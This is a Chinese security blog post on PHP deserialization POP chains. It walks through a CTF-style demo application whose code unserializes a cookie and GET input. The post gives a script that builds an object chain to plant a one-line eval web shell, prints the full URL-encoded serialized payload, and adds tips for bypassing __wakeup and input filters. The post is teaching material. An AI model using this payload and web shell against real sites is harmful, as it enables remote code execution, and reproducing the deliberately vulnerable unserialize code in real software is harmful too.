<!DOCTYPE html><html lang="zh-CN"><head><meta http-equiv="content-type" content="text/html; charset=utf-8"><meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport"><meta content="yes" name="apple-mobile-web-app-capable"><meta content="black-translucent" name="apple-mobile-web-app-status-bar-style"><meta content="telephone=no" name="format-detection"><meta name="description" content="常乐村伪基站"><title>POP链学习 | cL0und</title><link rel="stylesheet" type="text/css" href="/css/style.css?v=0.0.0"><link rel="stylesheet" type="text/css" href="//cdn.bootcss.com/normalize/7.0.0/normalize.min.css"><link rel="stylesheet" type="text/css" href="//cdn.bootcss.com/pure/1.0.0/pure-min.css"><link rel="stylesheet" type="text/css" href="//cdn.bootcss.com/pure/1.0.0/grids-responsive-min.css"><link rel="stylesheet" href="//cdn.bootcss.com/font-awesome/4.7.0/css/font-awesome.min.css"><script type="text/javascript" src="//cdn.bootcss.com/jquery/3.2.1/jquery.min.js"></script><link rel="Shortcut Icon" type="image/x-icon" href="/favicon.ico"><link rel="apple-touch-icon" href="/apple-touch-icon.png"><link rel="apple-touch-icon-precomposed" href="/apple-touch-icon.png"></head><body><div class="body_container"><div id="header"><div class="site-name"><h1 class="hidden">POP链学习</h1><a id="logo" href="/.">cL0und</a><p class="description">How can I to be an interesting web dog</p></div><div id="nav-menu"><a href="/." class="current"><i class="fa fa-home"> 首页</i></a><a href="/archives/"><i class="fa fa-archive"> 归档</i></a><a href="/about/"><i class="fa fa-user"> 关于</i></a><a href="/atom.xml"><i class="fa fa-rss"> 订阅</i></a></div></div><div id="layout" class="pure-g"><div class="pure-u-1 pure-u-md-3-4"><div class="content_container"><div class="post"><h1 class="post-title">POP链学习</h1><div class="post-meta">Oct 1, 2017<script src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js" async></script><span id="busuanzi_container_page_pv"> | <span id="busuanzi_value_page_pv"></span><span> 阅读</span></span></div><div class="post-content"><h3 id="挖掘思路"><a href="#挖掘思路" class="headerlink" title="挖掘思路"></a>挖掘思路</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">能控制反序列化的点</div><div class="line">反序列化类有魔术方法</div><div class="line">魔术方法里有敏感操作（常规思路）</div><div class="line">魔术方法里无敏感操作，但是通过属性（对象）调用了一些函数，恰巧在其他的类中有同名的函数（pop链）</div></pre></td></tr></table></figure>
<h3 id="demo"><a href="#demo" class="headerlink" title="demo"></a>demo</h3><p>来自<a href="http://www.cnblogs.com/iamstudy/articles/php_unserialize_pop_2.html" target="_blank" rel="external">柠檬师傅</a>的博客，建议小伙伴们拿到自己先做一下，构造<a href="http://www.cnblogs.com/iamstudy/articles/php_object_injection_pop_chain.html" target="_blank" rel="external">pop的方法</a></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div><div class="line">101</div><div class="line">102</div><div class="line">103</div><div class="line">104</div><div class="line">105</div><div class="line">106</div><div class="line">107</div><div class="line">108</div><div class="line">109</div><div class="line">110</div><div class="line">111</div><div class="line">112</div><div class="line">113</div><div class="line">114</div><div class="line">115</div><div class="line">116</div><div class="line">117</div><div class="line">118</div><div class="line">119</div><div class="line">120</div><div class="line">121</div><div class="line">122</div><div class="line">123</div><div class="line">124</div><div class="line">125</div><div class="line">126</div><div class="line">127</div><div class="line">128</div><div class="line">129</div><div class="line">130</div><div class="line">131</div><div class="line">132</div><div class="line">133</div><div class="line">134</div><div class="line">135</div><div class="line">136</div><div class="line">137</div><div class="line">138</div><div class="line">139</div><div class="line">140</div><div class="line">141</div><div class="line">142</div><div class="line">143</div><div class="line">144</div><div class="line">145</div><div class="line">146</div><div class="line">147</div><div class="line">148</div><div class="line">149</div><div class="line">150</div><div class="line">151</div><div class="line">152</div><div class="line">153</div><div class="line">154</div><div class="line">155</div><div class="line">156</div><div class="line">157</div><div class="line">158</div><div class="line">159</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line">class OutputFilter &#123;</div><div class="line">  protected $matchPattern;</div><div class="line">  protected $replacement;</div><div class="line">  function __construct($pattern, $repl) &#123;</div><div class="line">    $this-&gt;matchPattern = $pattern;</div><div class="line">    $this-&gt;replacement = $repl;</div><div class="line">  &#125;</div><div class="line">  function filter($data) &#123;</div><div class="line">    return preg_replace($this-&gt;matchPattern, $this-&gt;replacement, $data);</div><div class="line">  &#125;</div><div class="line">&#125;;</div><div class="line">class LogFileFormat &#123;</div><div class="line">  protected $filters;</div><div class="line">  protected $endl;</div><div class="line">  function __construct($filters, $endl) &#123;</div><div class="line">    $this-&gt;filters = $filters;</div><div class="line">    $this-&gt;endl = $endl;</div><div class="line">  &#125;</div><div class="line">  function format($txt) &#123;</div><div class="line">    foreach ($this-&gt;filters as $filter) &#123;</div><div class="line">      $txt = $filter-&gt;filter($txt);</div><div class="line">    &#125;</div><div class="line">    $txt = str_replace(&apos;\n&apos;, $this-&gt;endl, $txt);</div><div class="line">    return $txt;</div><div class="line">  &#125;</div><div class="line">&#125;;</div><div class="line">class LogWriter_File &#123;</div><div class="line">  protected $filename;</div><div class="line">  protected $format;</div><div class="line">  function __construct($filename, $format) &#123;</div><div class="line">    $this-&gt;filename = str_replace(&quot;..&quot;, &quot;__&quot;, str_replace(&quot;/&quot;, &quot;_&quot;, $filename));</div><div class="line">    $this-&gt;format = $format;</div><div class="line">  &#125;</div><div class="line">  function writeLog($txt) &#123;</div><div class="line">    $txt = $this-&gt;format-&gt;format($txt);</div><div class="line">    //TODO: Modify the address here, and delete this TODO.</div><div class="line">    file_put_contents(&quot;E:\\WWW\\test\\ctf&quot; . $this-&gt;filename, $txt, FILE_APPEND);</div><div class="line">  &#125;</div><div class="line">&#125;;</div><div class="line">class Logger &#123;</div><div class="line">  protected $logwriter;//这里装入LogWriter_File对象</div><div class="line">  function __construct($writer) &#123;</div><div class="line">    $this-&gt;logwriter = $writer;</div><div class="line">  &#125;</div><div class="line">  function log($txt) &#123;//这里偷梁换柱Song的log</div><div class="line">    $this-&gt;logwriter-&gt;writeLog($txt);</div><div class="line">  &#125;</div><div class="line">&#125;;</div><div class="line"></div><div class="line">class Song &#123;</div><div class="line">  protected $logger;</div><div class="line">  protected $name;</div><div class="line">  protected $group;</div><div class="line">  protected $url;</div><div class="line">  function __construct($name, $group, $url) &#123;</div><div class="line">    $this-&gt;name = $name;</div><div class="line">    $this-&gt;group = $group;</div><div class="line">    $this-&gt;url = $url;</div><div class="line">    $fltr = new OutputFilter(&quot;/\[i\](.*)\[\/i\]/i&quot;, &quot;&lt;i&gt;\\1&lt;/i&gt;&quot;);</div><div class="line">    $this-&gt;logger = new Logger(new LogWriter_File(&quot;song_views&quot;, new LogFileFormat(array($fltr), &quot;\n&quot;)));</div><div class="line">  &#125;</div><div class="line">  function __toString() &#123;</div><div class="line">    return &quot;&lt;a href=&apos;&quot; . $this-&gt;url . &quot;&apos;&gt;&lt;i&gt;&quot; . $this-&gt;name . &quot;&lt;/i&gt;&lt;/a&gt; by &quot; . $this-&gt;group;</div><div class="line">  &#125;</div><div class="line">  function log() &#123;</div><div class="line">    $this-&gt;logger-&gt;log(&quot;Song &quot; . $this-&gt;name . &quot; by [i]&quot; . $this-&gt;group . &quot;[/i] viewed.\n&quot;);</div><div class="line">  &#125;</div><div class="line">  function get_name() &#123;</div><div class="line">      return $this-&gt;name;</div><div class="line">  &#125;</div><div class="line">&#125;</div><div class="line"></div><div class="line">class Lyrics &#123;</div><div class="line">  protected $lyrics;</div><div class="line">  protected $song;</div><div class="line">  function __construct($lyrics, $song) &#123;</div><div class="line">    $this-&gt;song = $song;</div><div class="line">    $this-&gt;lyrics = $lyrics;</div><div class="line">  &#125;</div><div class="line">  function __toString() &#123;</div><div class="line">    return &quot;&lt;p&gt;&quot; . $this-&gt;song-&gt;__toString() . &quot;&lt;/p&gt;&lt;p&gt;&quot; . str_replace(&quot;\n&quot;, &quot;&lt;br /&gt;&quot;, $this-&gt;lyrics) . &quot;&lt;/p&gt;\n&quot;;</div><div class="line">  &#125;</div><div class="line">  function __destruct() &#123;</div><div class="line">    $this-&gt;song-&gt;log();</div><div class="line">  &#125;</div><div class="line">  function shortForm() &#123;</div><div class="line">    return &quot;&lt;p&gt;&lt;a href=&apos;song.php?name=&quot; . urlencode($this-&gt;song-&gt;get_name()) . &quot;&apos;&gt;&quot; . $this-&gt;song-&gt;get_name() . &quot;&lt;/a&gt;&lt;/p&gt;&quot;;</div><div class="line">  &#125;</div><div class="line">  function name_is($name) &#123;</div><div class="line">    return $this-&gt;song-&gt;get_name() === $name;</div><div class="line">  &#125;</div><div class="line">&#125;;</div><div class="line"></div><div class="line">class User &#123;</div><div class="line">  static function addLyrics($lyrics) &#123;</div><div class="line">    $oldlyrics = array();</div><div class="line">    if (isset($_COOKIE[&apos;lyrics&apos;])) &#123;</div><div class="line">      $oldlyrics = unserialize(base64_decode($_COOKIE[&apos;lyrics&apos;]));</div><div class="line">    &#125;</div><div class="line">    foreach ($lyrics as $lyric) $oldlyrics []= $lyric;</div><div class="line">    setcookie(&apos;lyrics&apos;, base64_encode(serialize($oldlyrics)));</div><div class="line">  &#125;</div><div class="line">  static function getLyrics() &#123;</div><div class="line">    if (isset($_COOKIE[&apos;lyrics&apos;])) &#123;</div><div class="line">      return unserialize(base64_decode($_COOKIE[&apos;lyrics&apos;]));</div><div class="line">    &#125;</div><div class="line">    else &#123;</div><div class="line">      setcookie(&apos;lyrics&apos;, base64_encode(serialize(array(1, 2))));</div><div class="line">      return array(1, 2);</div><div class="line">    &#125;</div><div class="line">  &#125;</div><div class="line">&#125;;</div><div class="line"></div><div class="line">class Porter &#123;</div><div class="line">  static function exportData($lyrics) &#123;</div><div class="line">    return base64_encode(serialize($lyrics));</div><div class="line">  &#125;</div><div class="line">  static function importData($lyrics) &#123;</div><div class="line">    return serialize(base64_decode($lyrics));</div><div class="line">  &#125;</div><div class="line">&#125;;</div><div class="line"></div><div class="line">class Conn &#123;</div><div class="line">  protected $conn;</div><div class="line">  function __construct($dbuser, $dbpass, $db) &#123;</div><div class="line">    $this-&gt;conn = mysqli_connect(&quot;localhost&quot;, $dbuser, $dbpass, $db);</div><div class="line">  &#125;</div><div class="line"></div><div class="line">  function getLyrics($lyrics) &#123;</div><div class="line">    $r = array();</div><div class="line">    foreach ($lyrics as $lyric) &#123;</div><div class="line">      $s = intval($lyric);</div><div class="line">      $result = $this-&gt;conn-&gt;query(&quot;SELECT data FROM lyrics WHERE id=$s&quot;);</div><div class="line">      while (($row = $result-&gt;fetch_row()) != NULL) &#123;</div><div class="line">        $r []= unserialize(base64_decode($row[0]));</div><div class="line">      &#125;</div><div class="line">    &#125;</div><div class="line">    return $r;</div><div class="line">  &#125;</div><div class="line"></div><div class="line">  function addLyrics($lyrics) &#123;</div><div class="line">    $ids = array();</div><div class="line">    foreach ($lyrics as $lyric) &#123;</div><div class="line">      $this-&gt;conn-&gt;query(&quot;INSERT INTO lyrics (data) VALUES (\&quot;&quot; . base64_encode(serialize($lyric)) . &quot;\&quot;)&quot;);</div><div class="line">      $res = $this-&gt;conn-&gt;query(&quot;SELECT MAX(id) FROM lyrics&quot;);</div><div class="line">      $id= $res-&gt;fetch_row(); $ids[]= intval($id[0]);</div><div class="line">    &#125;</div><div class="line">    echo var_dump($ids);</div><div class="line">    return $ids; </div><div class="line">  &#125;</div><div class="line"></div><div class="line">  function __destruct() &#123;</div><div class="line">    $this-&gt;conn-&gt;close();</div><div class="line">    $this-&gt;conn = NULL;</div><div class="line">  &#125;</div><div class="line">&#125;;</div><div class="line"></div><div class="line">unserialize($_GET[&apos;cmd&apos;]);</div></pre></td></tr></table></figure>
<h3 id="操作过程"><a href="#操作过程" class="headerlink" title="操作过程"></a>操作过程</h3><p>1、先找unserialize函数</p>
<p>在class user中有</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div></pre></td><td class="code"><pre><div class="line">class User &#123;</div><div class="line">  static function addLyrics($lyrics) &#123;</div><div class="line">    $oldlyrics = array();</div><div class="line">    if (isset($_COOKIE[&apos;lyrics&apos;])) &#123;</div><div class="line">      $oldlyrics = unserialize(base64_decode($_COOKIE[&apos;lyrics&apos;]));</div><div class="line">    &#125;</div><div class="line">    foreach ($lyrics as $lyric) $oldlyrics []= $lyric;</div><div class="line">    setcookie(&apos;lyrics&apos;, base64_encode(serialize($oldlyrics)));</div><div class="line">  &#125;</div><div class="line">  static function getLyrics() &#123;</div><div class="line">    if (isset($_COOKIE[&apos;lyrics&apos;])) &#123;</div><div class="line">      return unserialize(base64_decode($_COOKIE[&apos;lyrics&apos;]));</div><div class="line">    &#125;</div><div class="line">    else &#123;</div><div class="line">      setcookie(&apos;lyrics&apos;, base64_encode(serialize(array(1, 2))));</div><div class="line">      return array(1, 2);</div><div class="line">    &#125;</div><div class="line">  &#125;</div><div class="line">&#125;;</div></pre></td></tr></table></figure>
<p>我们看到<code>$oldlyrics = unserialize(base64_decode($_COOKIE[&#39;lyrics&#39;]));</code>里面cookie可控</p>
<p>那么问题来了，一个可控的unserialize点意味着什么？</p>
<p><strong>意味着你能控制{当前的定义的类或者自动加载能找到的类}的属性</strong>（这个对象属性当然可以是一个对象）</p>
<p>接着就可以寻找可以搞事的魔术方法，很快就会发现<code>class Lyrics</code>中有两个魔术方法</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">function __toString() &#123;</div><div class="line">    return &quot;&lt;p&gt;&quot; . $this-&gt;song-&gt;__toString() . &quot;&lt;/p&gt;&lt;p&gt;&quot; . str_replace(&quot;\n&quot;, &quot;&lt;br /&gt;&quot;, $this-&gt;lyrics) . &quot;&lt;/p&gt;\n&quot;;</div><div class="line">&#125;</div><div class="line">function __destruct() &#123;</div><div class="line">    $this-&gt;song-&gt;log();</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>我们发现两个魔术方法都没有什么敏感的操作，那么这个时候我们可以考虑构造POP链</p>
<p>通读代码可以发现程序员的本意是利用<code>class song</code>的log的方法，但是这个时候我们发现</p>
<p><code>class Logger</code>也有log方法</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">class Logger &#123;</div><div class="line">  protected $logwriter;</div><div class="line">  function __construct($writer) &#123;</div><div class="line">    $this-&gt;logwriter = $writer;</div><div class="line">  &#125;</div><div class="line">  function log($txt) &#123;</div><div class="line">    $this-&gt;logwriter-&gt;writeLog($txt);</div><div class="line">  &#125;</div><div class="line">&#125;;</div></pre></td></tr></table></figure>
<p>更加惊奇的是我们发现一个可以写文件的类这个类中方法<code>writeLog</code></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line">class LogWriter_File &#123;</div><div class="line">  protected $filename;</div><div class="line">  protected $format;</div><div class="line">  function __construct($filename, $format) &#123;</div><div class="line">    $this-&gt;filename = str_replace(&quot;..&quot;, &quot;__&quot;, str_replace(&quot;/&quot;, &quot;_&quot;, $filename));</div><div class="line">    $this-&gt;format = $format;</div><div class="line">  &#125;</div><div class="line">  function writeLog($txt) &#123;</div><div class="line">    $txt = $this-&gt;format-&gt;format($txt);</div><div class="line">    //TODO: Modify the address here, and delete this TODO.</div><div class="line">    file_put_contents(&quot;E:\\WWW\\test\\ctf&quot; . $this-&gt;filename, $txt, FILE_APPEND);</div><div class="line">  &#125;</div><div class="line">&#125;;</div></pre></td></tr></table></figure>
<p>至此一条完整的POP链思路貌似出现在眼前</p>
<p>我们新建一个<code>Lyrics</code>对象将它的song属性填充成<code>Logger</code>对象,再<code>把logger</code>对象的<code>logwriter</code>的属性填充成<code>LogWriter_File</code>对象，最后传送给cookie,在<code>Lyrics</code>对象被销毁的时候就可以触发<code>__destruct()</code></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">$arr = array(new OutputFilter(&quot;//&quot;,&quot;&lt;?php eval(\$_POST[&apos;c&apos;]);?&gt;&quot;));</div><div class="line">$obj1 = new LogFileFormat($arr,&apos;\n&apos;);</div><div class="line">$obj2 = new LogWriter_File(&quot;shell2333.php&quot;,$obj1);</div><div class="line">$obj3 = new Logger($obj2);</div><div class="line">$obj = new Lyrics(&quot;2333&quot;,$obj3);</div><div class="line">file_put_contents(&quot;serialize.txt&quot;, urlencode(serialize($obj)));</div></pre></td></tr></table></figure>
<p>serialize.txt可以找到这一坨</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">O%3A6%3A%22Lyrics%22%3A2%3A%7Bs%3A9%3A%22%00%2A%00lyrics%22%3Bs%3A4%3A%222333%22%3Bs%3A7%3A%22%00%2A%00song%22%3BO%3A6%3A%22Logger%22%3A1%3A%7Bs%3A12%3A%22%00%2A%00logwriter%22%3BO%3A14%3A%22LogWriter_File%22%3A2%3A%7Bs%3A11%3A%22%00%2A%00filename%22%3Bs%3A13%3A%22shell2333.php%22%3Bs%3A9%3A%22%00%2A%00format%22%3BO%3A13%3A%22LogFileFormat%22%3A2%3A%7Bs%3A10%3A%22%00%2A%00filters%22%3Ba%3A1%3A%7Bi%3A0%3BO%3A12%3A%22OutputFilter%22%3A2%3A%7Bs%3A15%3A%22%00%2A%00matchPattern%22%3Bs%3A2%3A%22%2F%2F%22%3Bs%3A14%3A%22%00%2A%00replacement%22%3Bs%3A26%3A%22%3C%3Fphp+eval%28%24_POST%5B%27c%27%5D%29%3B%3F%3E%22%3B%7D%7Ds%3A7%3A%22%00%2A%00endl%22%3Bs%3A2%3A%22%5Cn%22%3B%7D%7D%7D%7D</div></pre></td></tr></table></figure>
<p>GET一次，即可拿到shell</p>
<h2 id="最后"><a href="#最后" class="headerlink" title="最后"></a>最后</h2><p>记录一下反序列化注意点具体见<a href="http://godot.win/index.php/archives/11/" target="_blank" rel="external">Godot师傅</a></p>
<p>1、<strong>当成员属性数目大于实际数目时可绕过wakeup方法(CVE-2016-7124)</strong></p>
<p>2、<strong>CTF中成员属性数目前面多一个<code>+</code>可以绕过正则</strong></p>
<p>3、<strong>protect属性和private会产生一些浏览器看不见的字符</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line">	class cl0und&#123;</div><div class="line">		public $test1 = &apos;1&apos;;</div><div class="line">		protected $test2 = &apos;2&apos;;</div><div class="line">		private $test3 = &apos;3&apos;;</div><div class="line">	&#125;</div><div class="line">	$obj = new cl0und();</div><div class="line">	echo serialize($obj);</div><div class="line">	file_put_contents(&quot;serialize.txt&quot;, data)</div></pre></td></tr></table></figure>
<p> <img src="1.png" alt=""></p>
<p>4、会很有用的函数<code>get_included_files()</code>,<code>get_declared_classes()</code></p>
<p>5、如果通过上面的函数依然没有找到合适的类，可以尝试利用<code>spl_autoload_register</code></p>
<p>6、<a href="http://ph0rse.me/2017/09/27/%E4%B8%80%E9%81%93%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%A2%98%E7%9B%AE%E5%BC%95%E8%B5%B7%E7%9A%84%E6%80%9D%E8%80%83/" target="_blank" rel="external">session序列化反序列化机制不同造成漏洞</a></p>
<h2 id="最最后"><a href="#最最后" class="headerlink" title="最最后"></a>最最后</h2><p>无意间在看<a href="http://php.net/manual/zh/migration56.deprecated.php" target="_blank" rel="external">php文档</a>的时候发现一个5.6.x后废弃的特性，叫做 <strong>上下文调用方法</strong>，功能是在上下文语境中可以调用用类::的模式调用非静态方法(?)，一个demo如下</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line">class A &#123;</div><div class="line">    function m() &#123; echo get_class($this); &#125;</div><div class="line">&#125;</div><div class="line"></div><div class="line">class B &#123;</div><div class="line">    function f() &#123; eval($_POST[&apos;cmd&apos;]);&#125;</div><div class="line">&#125;</div><div class="line"></div><div class="line">(new B)-&gt;f();</div><div class="line">?&gt;</div></pre></td></tr></table></figure>
<p> <img src="2.png" alt=""></p>
<h2 id="最最最后"><a href="#最最最后" class="headerlink" title="最最最后"></a>最最最后</h2><p>如有问题请指教</p>
<p>国庆快乐！</p>
</div><div class="tags"><a href="/tags/代码审计/">代码审计</a></div><div class="post-nav"><a href="/2017/09/27/Xdebug原理学习及攻击面复现/" class="next">Xdebug原理学习及其攻击面复现</a></div></div></div></div><div class="pure-u-1-4 hidden_mid_and_down"><div id="sidebar"><div class="widget"><div class="search-form"><input id="local-search-input" placeholder="Search" type="text" name="q" results="0"/><div id="local-search-result"></div></div></div><div class="widget"><div class="widget-title"><i class="fa fa-folder-o"> 分类</i></div></div><div class="widget"><div class="widget-title"><i class="fa fa-star-o"> 标签</i></div><div class="tagcloud"><a href="/tags/代码审计/" style="font-size: 15px;">代码审计</a> <a href="/tags/XSS/" style="font-size: 15px;">XSS</a></div></div><div class="widget"><div class="widget-title"><i class="fa fa-file-o"> 最近文章</i></div><ul class="post-list"><li class="post-list-item"><a class="post-list-link" href="/2017/10/01/POP链学习/">POP链学习</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/09/27/Xdebug原理学习及攻击面复现/">Xdebug原理学习及其攻击面复现</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/09/01/记录xss挑战赛14题解题过程/">记录xss挑战赛14题解题过程</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/08/20/TP框架3.2缓存漏洞/">TP框架3.2缓存漏洞</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/08/17/通过函数重定义绕过xss过滤器/">通过函数重定义绕过xss过滤器(IE)</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/08/17/hadsky部分用户任意登录/">hadsky部分用户任意登录</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/08/17/hello-world/">Hello World</a></li></ul></div><div class="widget"><div class="widget-title"><i class="fa fa-external-link"> 友情链接</i></div><ul></ul><a href="http://l0ca1.me" title="l0ca1" target="_blank">l0ca1</a><ul></ul><a href="http://kaljes.club" title="J3s" target="_blank">J3s</a><ul></ul><a href="http://godot.win" title="Godot" target="_blank">Godot</a><ul></ul><a href="http://hebic.me" title="H''Homaebic" target="_blank">H''Homaebic</a><ul></ul><a href="http://reversing.win" title="7o8v" target="_blank">7o8v</a><ul></ul><a href="http://ph0rse.me/" title="ph0rse" target="_blank">ph0rse</a></div></div></div><div class="pure-u-1 pure-u-md-3-4"><div id="footer">Copyright © 2017 <a href="/." rel="nofollow">cL0und.</a> Powered by<a rel="nofollow" target="_blank" href="https://hexo.io"> Hexo.</a><a rel="nofollow" target="_blank" href="https://github.com/tufu9441/maupassant-hexo"> Theme</a> by<a rel="nofollow" target="_blank" href="https://github.com/pagecho"> Cho.</a></div></div></div><a id="rocket" href="#top" class="show"></a><script type="text/javascript" src="/js/totop.js?v=0.0.0" async></script><script type="text/javascript" src="//cdn.bootcss.com/fancybox/3.1.20/jquery.fancybox.min.js" async></script><script type="text/javascript" src="/js/fancybox.js?v=0.0.0" async></script><link rel="stylesheet" type="text/css" href="//cdn.bootcss.com/fancybox/3.1.20/jquery.fancybox.min.css"><script type="text/javascript" src="/js/search.js?v=0.0.0"></script><script>var search_path = 'search.xml';
if (search_path.length == 0) {
   search_path = 'search.xml';
}
var path = '/' + search_path;
searchFunc(path, 'local-search-input', 'local-search-result');
</script><script type="text/javascript" src="/js/codeblock-resizer.js?v=0.0.0"></script><script type="text/javascript" src="/js/smartresize.js?v=0.0.0"></script></div></body></html>